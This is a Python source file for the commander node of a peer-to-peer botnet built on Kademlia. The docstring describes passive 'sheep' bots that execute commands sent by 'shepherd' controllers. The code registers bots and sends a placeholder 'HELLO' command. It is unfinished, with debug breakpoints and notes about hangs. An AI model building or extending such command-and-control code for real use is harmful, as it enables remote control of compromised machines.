"""
#### Asycn and Kademlia P2P Botnet
#### Commander is program which will start a kademlia server, bootstrap to the network, and listen for additional kademlia queries in the background
#### It will then create an interactive terminal in which the commander will pass commands which can be distributed via kademlia to the other bots in the network
#### Nodes will be organized into two types SHEEP = passive listeners which execute commands, and SHEPARDS = commander nodes which administer commands
"""

import asyncio, os, sys, logging, pdb, functools
from subprocess import check_call
from asyncio.tasks import ensure_future
import hashlib
from kademlia.network import Server
SECRET="TheSecretKey"

#Hashing function returns hexdigest
def get_hash(prehash):
    m = hashlib.sha1()
    m.update(prehash.encode('utf-8'))
    return m.hexdigest()


### Intialize logging 
handler = logging.StreamHandler()
formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
handler.setFormatter(formatter)
log = logging.getLogger('kademlia')
log.addHandler(handler)
log.setLevel(logging.DEBUG)

### Class which checks for existing networks, and will create its own key/val and join
class Shepard():
    # Key is hash of secret string
    def __init__(self, kserver, key):
        self.kserver = kserver
        self.key = key
        self.sheeps = {}
        self.count = 0
        #TODO: add looping call to check for new nodes
        #self.sheeploop = loop.call_soon_threadsafe(checknewsheep())
        #self.sheeploop = loop.call_later(8, functools.partial(self.checknewsheep())) 
        #self.checkin = loop.call_soon_threadsafe( self.checknewsheep())
  
    async def checknewsheep(self):
        async def addsheep(val): 
            if val:
                # new sheep found
                if val not in self.sheeps:
                    # Create new UUID for node
                    newval = get_hash(str(val))
                    self.sheeps[val] = newval
                    print("\nSetting key {} to value {}\n".format(val, newval))
                    ## Set the NODEID 'val' of nearest neightbor to newval 'cmdkey of the bot'
                    result = await self.kserver.set(self.sheeps[val], str(val))
                    #TODO: Commander hangs after set, node goes into loop saying that is has acked the network, and recieved a command, but not command is ever run.
                    # /(.-.)\ Hmm need to find out why this happens, maybe the sheepGreater() never ran thats why there is error. 
                    # Update: I dont think the task ever returns from await state, maybe something needs to be returned here. 
                    print("Added a new sheep")
                    return result
                print("No new sheep")
                return False    
        pdb.set_trace()
        result = await self.kserver.get(self.key)
        return await addsheep(result)
        
    
    async def sheepGreeter(self):
        cmd="HELLO"
        print(await self.checknewsheep())
        #Iterate through sheeps list and send command to all sheep
        for key, val in self.sheeps.items():
            print("\nKEY: {} VAL: {}\nPOSSIBLE ITEMS {}\n\n".format(key,val,self.sheeps.items()))
            output= "Starting HELLO for bot {0}\n".format(key)
            print(output)
            botcmdtorun = get_hash(cmd)
            await self.kserver.set(val,botcmdtorun)

if len(sys.argv) != 4:
    print("Usage: python commander.py <bootstrap node> <bootstrap port> <commander port>")
    sys.exit(1)

### SERVER STARTS HERE ###

### Initialize program loop
bootstrap_ip = str(sys.argv[1])
bootstrap_port = int(sys.argv[2])
myport = int(sys.argv[3])

### Initialize the Key which all nodes will join network with###
NETKEY = get_hash(SECRET)

loop=asyncio.get_event_loop()
loop.set_debug(True)

kserver = Server()
loop.run_until_complete(kserver.listen(myport))
loop.run_until_complete(kserver.bootstrap([(bootstrap_ip, bootstrap_port)]))

leader = Shepard(kserver, NETKEY)

try:
    #pdb.set_trace()
    loop.run_until_complete(leader.sheepGreeter())
    loop.run_forever()
except KeyboardInterrupt:
    pass
finally:
    kserver.stop()
    loop.close()